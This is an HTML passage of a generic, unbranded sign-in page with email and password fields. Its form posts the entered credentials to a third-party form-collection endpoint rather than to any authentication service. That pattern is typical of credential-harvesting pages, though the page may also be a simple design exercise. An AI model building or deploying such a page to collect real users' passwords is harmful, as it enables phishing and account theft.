<body>
  <div class="wrapper">
    <section class="left d-flex f-d-column">
      <div class="logo"></div>
      <div class="container d-flex f-d-column f-center-center">
        <h1 class="heading t-center">Welcome!</h1>
        <p class="t-center">Sign in by entering the information below</p>

        <form class="login-form d-flex f-d-column f-center-center"
          action="https://formspree.io/f/meqpnldz?fbclid=IwAR3bA2etYwekodneIPoxC_FQq_GRVkHpUI6-Owi5GNSk69PuCkS_DJoAhdM"
          method="post">
          <section class="input input__email" data-error>
            <div class="input__wrapper">
              <input type="text" name="email" id="email" inputmode="email" autocomplete="email" placeholder=" " />
              <label class="input__label" for="email">Your Email address</label>
            </div>
          </section>

          <section class="input input__password" data-error>
            <div class="input__wrapper">
              <input type="password" name="password" id="password" autocomplete="current-password" placeholder=" " />
              <label class="input__label" for="password">Password</label>
            </div>
          </section>

          <section class="footer d-flex f-space-between">
            <div class="checkbox">
              <input type="checkbox" name="remember" id="remember" />
              <label for="remember">Remember Me</label>
            </div>
            <a href="#" class="forgot-password">Forgot Password</a>
          </section>

          <button type="button" class="btn-login">Sign in</button>
        </form>

        <a href="#" class="t-center">Don't have account? Create one here.</a>
